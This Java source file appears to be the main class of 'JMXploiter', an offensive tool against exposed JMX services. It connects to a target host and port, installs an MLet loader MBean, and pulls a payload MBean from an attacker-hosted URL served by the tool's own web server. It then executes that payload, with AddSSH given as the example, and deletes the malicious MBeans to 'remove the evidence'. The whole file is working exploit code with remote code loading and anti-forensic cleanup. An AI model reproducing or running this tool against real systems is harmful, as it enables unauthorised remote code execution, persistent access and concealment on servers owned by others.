package runnable;

import jmxManagers.JMXConnectionManager;
import jmxManagers.JMXMBeanManager;
import org.apache.commons.cli.*;
import payloadManager.PayloadHandler;
import webserver.WebServer;

import javax.management.MBeanServerConnection;

public class JMXploiter {

    public static final int ARGS_MINIMUM_LENGTH = 1;

    //Default section
    private static final String CONFIGURATION_FILENAME = "properties.conf";
    //Flag section
    private static final String HELP_FLAG = "h";
    private static final String GENERATE_PAYLOAD_FLAG = "g";
    private static final String LIST_PAYLOAD_FLAG = "l";
    private static final String TARGET_FLAG = "rhost";
    private static final String TARGET_PORT_FLAG = "rport";
    private static final String SRV_HOST_FLAG = "lhost";
    private static final String SRV_PORT_FLAG = "lport";
    private static final String UNINSTALL_PAYLOAD_FLAG = "u";
    private static final String NO_UNINSTALL_FLAG = "nou";
    private static final String NO_WEB_SERVER_FLAG = "noserver";
    private static final String ON_DEMAND_PAYLOAD_FLAG = "p";
    private static final String DEBUG_FLAG = "debug";

    //Flags to handle method and parameters
    //i.e. --method pwn --param everything,nomercy,true
    private static final String METHOD_FLAG = "m";
    private static final String PARAM_FLAG = "param";

    private static final String USAGE_STRING = "Usage: " + new java.io.File(JMXploiter.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getName() + " -rhost 127.0.0.1 -rport 1099 -p AddSSH";

    public static void main(String[] args) throws ParseException {

        Options options = new Options();

        options.addOption(HELP_FLAG, "help", false, "Print the options and exit.")
                .addOption(Option.builder(GENERATE_PAYLOAD_FLAG).argName("mbean")
                        .desc("generates prebuilt mbean payload and exits")
                        .hasArg(true).build())
                .addOption(LIST_PAYLOAD_FLAG, false, "lists all payloads and exits")
                .addOption(Option.builder(TARGET_FLAG).argName("ip")
                        .desc("specifies the target host")
                        .hasArg(true).build())
                .addOption(Option.builder(TARGET_PORT_FLAG).argName("port")
                        .desc("sets the target port")
                        .hasArg(true).build())
                .addOption(Option.builder(ON_DEMAND_PAYLOAD_FLAG).longOpt("payload").argName("mbean")
                        .desc("specifies a payload to generate and use")
                        .hasArg(true).build())
                .addOption(Option.builder(SRV_HOST_FLAG).argName("ip")
                        .desc("the host to load the payload from")
                        .hasArg(true).build())
                .addOption(Option.builder(SRV_PORT_FLAG).argName("port")
                        .desc("the port to load the payload from")
                        .hasArg(true).build())
                .addOption(Option.builder(NO_WEB_SERVER_FLAG)
                        .desc("do not turn on internal file server")
                        .hasArg(false).build())
                .addOption(Option.builder(NO_UNINSTALL_FLAG)
                        .desc("do not uninstall the payload after execution")
                        .hasArg(false).build())
                .addOption(Option.builder(UNINSTALL_PAYLOAD_FLAG)
                        .desc("cleanup/uninstall mbean with config name")
                        .hasArg(false).build())
                .addOption(Option.builder(METHOD_FLAG).argName("method").longOpt("method")
                        .desc("method to call (e.g. addSSH)")
                        .hasArg(true).build())
                .addOption(Option.builder(PARAM_FLAG).longOpt("params").argName("[param]")
                        .desc("params to use, only Strings allowed")
                        .hasArg(true).build())
                .addOption(Option.builder(DEBUG_FLAG).hasArg(false)
                        .desc("turn on compilation debugging")
                        .hasArg(false).build());

        CommandLineParser parser = new DefaultParser();
        CommandLine cmd = parser.parse(options, args);

        HelpFormatter help = new HelpFormatter();
        help.setOptionComparator(null);

        //Any cleanup to do can go here
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            try {
                JMXConnectionManager.closeJMXConnection();
                System.out.println("\nGoodbye");
            } catch (Exception e) {
                System.out.println("\nGoodbye");
            }
        }));

        //If no args provided, help message should be displayed along with basic use case
        if (args.length < ARGS_MINIMUM_LENGTH) {
            help.printHelp(USAGE_STRING, options);
            System.exit(0);
        }

        // Init the directories needed for payload
        PayloadHandler.initialize_directories();

        //Load the mbean names to use from the config file, have to do this early
        JMXMBeanManager.loadObjectNames();

        //Handle the arguments
        processArgs(cmd, options, help);

        //Get initial server connection
        MBeanServerConnection serverConnection = JMXConnectionManager.getJMXServerConnection();
        System.out.println("Got a connection to the target...");

        //Create the loading MBean from the server connection
        JMXMBeanManager.installJavaxLoadingMLet(serverConnection);

        //load the payload from URL
        System.out.println("Now attempting to load a payload from the provided URL");
        PayloadHandler.getMBeanFromURL(serverConnection, JMXMBeanManager.getLoaderMBeanName());

        //Invoke the payload and get the results
        System.out.println("Now attempting to run the payload\n");
        String response = PayloadHandler.executePayload(serverConnection);
        System.out.println("[+] Exploit result: " + response);

        //remove the evidence
        System.out.println("Exploit complete, cleaning up.");
        PayloadHandler.removeMaliciousMBeans(serverConnection);
        WebServer.stopServer();

        //close connection
        JMXConnectionManager.closeJMXConnection();
    }

    public static String getPropertiesFileName() {
        return CONFIGURATION_FILENAME;
    }

    private static void processArgs(CommandLine cmd, Options options, HelpFormatter help) {
        boolean hostFlagSet = false, portFlagSet = false;

        if (cmd.hasOption(HELP_FLAG)) {
            help.printHelp(USAGE_STRING, options);
            System.exit(0);
        }
        if (cmd.hasOption(LIST_PAYLOAD_FLAG)) {
            System.out.println("Listing payloads and exiting");
            PayloadHandler.listPayloads();
            System.exit(0);
        }
        if (cmd.hasOption(GENERATE_PAYLOAD_FLAG)) {
            PayloadHandler.generateMBeanPayloadKit(cmd.getOptionValue(GENERATE_PAYLOAD_FLAG));
            System.out.println("Payload saved to output directory: " + PayloadHandler.getOutputDirectory() + PayloadHandler.getpayloadOutputName() + System.getProperty("line.separator") +
                    "This tool can host this automatically, or you can move it to a remote server.");
            System.exit(0);
        }
        if (cmd.hasOption(DEBUG_FLAG)) {
            PayloadHandler.setDebug(true);
        }
        if (cmd.hasOption(TARGET_FLAG)) {
            JMXConnectionManager.setTargetHost(cmd.getOptionValue(TARGET_FLAG));
            hostFlagSet = true;
        }
        if (cmd.hasOption(TARGET_PORT_FLAG)) {
            JMXConnectionManager.setTargetPort(cmd.getOptionValue(TARGET_PORT_FLAG));
            portFlagSet = true;
        }
        if (cmd.hasOption(SRV_HOST_FLAG)) {
            PayloadHandler.setLHost(cmd.getOptionValue(SRV_HOST_FLAG));
        }
        if (cmd.hasOption(SRV_PORT_FLAG)) {
            PayloadHandler.setLPort(cmd.getOptionValue(SRV_PORT_FLAG));
        }
        if (cmd.hasOption(NO_WEB_SERVER_FLAG)) {
            PayloadHandler.setServePayload(false);
        }
        if (cmd.hasOption(UNINSTALL_PAYLOAD_FLAG)) {
            System.out.println("Uninstall flag detected. Attempting to search for and uninstall old payload");
            PayloadHandler.uninstall(JMXConnectionManager.getJMXServerConnection());
            System.out.println("Payload should be uninstalled, exiting");
            System.exit(0);
        }
        if (cmd.hasOption(METHOD_FLAG)) {
            PayloadHandler.setMethodsToCall(cmd.getOptionValue(METHOD_FLAG));
        }
        if (cmd.hasOption(PARAM_FLAG)) {
            PayloadHandler.setParamsToUse(cmd.getOptionValue(PARAM_FLAG));
        }
        if (cmd.hasOption(NO_UNINSTALL_FLAG)) {
            PayloadHandler.setUninstall(false);
        }
        if (cmd.hasOption(ON_DEMAND_PAYLOAD_FLAG)) {
            String payloadToGenerate = cmd.getOptionValue(ON_DEMAND_PAYLOAD_FLAG);
            System.out.println("Attempting to generate a payload: " + payloadToGenerate);
            PayloadHandler.generateMBeanPayloadKit(payloadToGenerate);
        }

        if (!(hostFlagSet && portFlagSet)) {
            help.printHelp(USAGE_STRING, options);
            System.exit(0);
        }
    }


}

